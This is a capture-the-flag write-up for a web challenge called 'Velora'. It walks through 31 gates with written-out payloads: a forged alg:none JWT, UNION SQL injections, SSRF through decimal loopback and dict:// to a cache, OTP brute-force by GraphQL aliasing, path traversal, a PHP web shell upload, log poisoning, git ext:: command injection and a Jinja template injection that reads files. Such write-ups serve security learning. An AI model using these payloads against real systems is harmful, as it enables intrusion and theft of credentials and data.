# Velora

> Web · Not shown · evil l0rd  
> Points at solve: Not recorded

**Tools used**

- Python 3  (`urllib`, `http.cookiejar`, JSON/base64); the solver automates requests and carries cookies and `X-Chain` proofs.
- `gobuster`
- `fuff`

**Approach**

Each `/x/<id>` gate consumes the accumulated `X-Chain` proof and returns the next entry. The IDs and proofs rotate, so fetch them during the run. The solver first creates an account, then reads fresh entries from `/`, `/robots.txt`, and `/static/app.js`; those entries lead through L1–L4. Pre-step requests below must be made before visiting the corresponding returned entry.

1. **L1–L4 — Bootstrap and account state:** The root page, robots file, and app bundle each expose a rotating `/x/<id>` entry. Visit them in order, carrying every returned proof. Before L4, sign up with a fresh email, member ID, and the design-review account details; L4 confirms the plan state.
2. **L5 — Member settings:** The L4 response and supplied member ID point to `/api/members/<MEMBER_ID>/settings`. Read it before visiting L5; it reveals the Staff tier and console location.
3. **L6 — Login:** Log in using the signup credentials before visiting L6. The response confirms the design-review session and sets `velora_session`.
4. **L7 — Console authorization:** `/docs`/the session behavior shows the JWT is accepted without a signature check. Decode and preserve its existing claims, set `role=admin`, and use an `alg:none` header. The operator cookie and current chain proofs are also required.
5. **L8 — Legacy export:** The console-enabled path `/api/v1/export/1001` returns the partner PDF used by this gate.
6. **L9 — Catalog route discovery:** The catalog endpoint accepts a seven-column UNION-shaped query. Use:

   ```sql
   ' UNION SELECT id,name,detail,NULL,NULL,NULL,NULL FROM fabric_routes--
   ```

   The returned route map identifies the internal Fabric service and available ports.
7. **L10 — Internal host:** The route map and preview response identify `fabric.velora.internal`. Request it through `/api/preview` with `X-Forwarded-Host: fabric.velora.internal`, then visit the L10 entry with that header.
8. **L11 — Repeat preview:** Repeat the internal preview pre-step before visiting L11. The solver currently sends the forwarded-host header on this preview too; do not claim this run independently proves the header persisted from L10.
9. **L12 — Decimal loopback:** The preview filter rejects literal private IPs; `2130706433` is an alternate representation of `127.0.0.1`. Request port 80 through the preview worker.
10. **L13 — Cache service:** The L12 response confirms the alternate-origin path; request the same decimal loopback on port 6379 to identify the cache protocol.
11. **L14 — Cache key listing:** The cache responds to a `dict://` URL. Request `dict://2130706433:6379/keys:*`; the result lists `operator.session`.
12. **L15 — Operator session value:** Read `operator.session` using `dict://2130706433:6379/get%20operator.session` and retain its returned value.
13. **L16 — Operator cookie:** Set the `operator` cookie to that value before visiting L16; the gate then accepts the restored operator session.
14. **L17–L18 — GraphQL persisted queries:** Send a query and matching SHA-256 persisted-query extension together: first `{ health }`, then `{ accounts { holder internalLedgerKey } }`. The first confirms GraphQL access; the second exposes account/ledger data.
15. **L19 — Step-up:** The challenge accepts a single mutation with 100,000 aliased `verifyOtp` fields, covering five-digit codes in one request. This is a large one-request payload, not repeated login attempts.
16. **L20 — Dashboard template:** Load `/dashboard`, then the known home template. The returned dashboard page establishes the template-loading behavior used for the next gate.
17. **L21 — Schema file:** The dashboard's `page` parameter loads templates. Request `dashboard-pages/../../secret/schema.txt`; it reveals `config(name,value)`, `nav(link,label)`, and the `settlement_record` key.
18. **L22 — Handler configuration:** `/library?doc=` loads documentation paths. Traversing to Apache's PHP handler config reveals that handler tokens are matched within a filename, motivating the `.php.png` upload name.
19. **L23 — Desk upload:** Upload `sh.php.png` containing the PHP-looking `system($_GET["c"])` payload, then request it with `c=id`. The response supplies the desk account identity accepted by the gate.
20. **L24 — Access-log include:** The earlier dashboard traversal can include the access log. Put the same PHP-looking payload in `User-Agent`, then request the log with `c=id`; the returned identity advances the gate. Treat this as challenge behavior, not proof of real PHP execution.
21. **L25 — Service account name:** Reuse the apparent log command to request `/entrypoint.sh`; extract `RECON_USER` from the response for the settlement service.
22. **L26 — Reconcile secret:** Use the accepted upload payload with `cat /opt/velora/reconcile.env`; extract the per-instance `RECON_PASS`.
23. **L27 — Job script:** POST `/import` with `repo_url=ext::sh -c cat${IFS}/opt/velora/nightly.sh>&2`. The response provides the scheduled job/reconciliation behavior.
24. **L28 — Release note and navigator query:** The demo form renders its `name` field. Submit:

    ```jinja
    {{ cycler.__init__.__globals__.os.popen('cat /root/velora/release.note').read() }}
    ```

    The returned note provides the navigator query shape: `SELECT link, label FROM nav WHERE role = '<role>' ORDER BY sort`.
25. **L29 — Reconcile:** The job script and extracted credentials identify `/ledger/reconcile`. Request it through `/api/preview` using basic auth in the URL; the response reports `RC-8841` and `config updated`.
26. **L30 — Record delay:** The L28 query shape explains how the gate consumes the JWT role. Forge `alg:none` with role `x' UNION SELECT '/delay',sleep(3) #`; visit L30. The gate returns `Delay recorded.`; no actual three-second delay was observed.
27. **L31 — Read settlement record:** Reuse the unsigned JWT carrier with role `x' UNION SELECT value,value FROM config WHERE name='settlement_record' #`. Visit L31 to retrieve the settlement value and flag.

**Why it works**

The `/x/` gates accept the expected state and payload shapes and issue the next proof. The schema and release note provide the names and query shape used at the final gates. The techniques resemble SQL injection, SSRF, template injection, and file inclusion, but the observed responses do not establish that SQL, PHP, a shell, or filesystem reads actually executed. For example, `sleep(3)` caused no observed delay, the purported filesystem was inconsistent with the Python entrypoint, and command output was canned. Describe these as challenge-accepted payloads, not verified real-world exploitation.

**Validation**

The solver completed all 31 gates on the challenge instance and received the L31 success response with the flag contained.